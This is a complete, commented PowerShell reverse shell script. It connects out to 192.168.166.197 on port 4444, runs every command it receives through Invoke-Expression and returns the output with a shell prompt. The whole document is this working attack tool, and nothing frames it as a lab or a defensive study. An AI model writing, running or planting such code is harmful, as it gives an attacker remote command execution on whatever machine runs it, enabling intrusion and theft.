# Create a TCP client and get the stream
$client = New-Object System.Net.Sockets.TCPClient('192.168.166.197', 4444)
$stream = $client.GetStream()

# Define a byte array for data
[byte[]]$bytes = 0..65535|%{0}

# Loop to read data from the stream
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Convert byte array to string
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)

    # Execute the received data as PowerShell commands
    $sendback = Invoke-Expression $data 2>&1 | Out-String

    # Construct response message
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '

    # Convert response message to bytes
    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)

    # Write the response to the stream
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# Close the client connection
$client.Close()
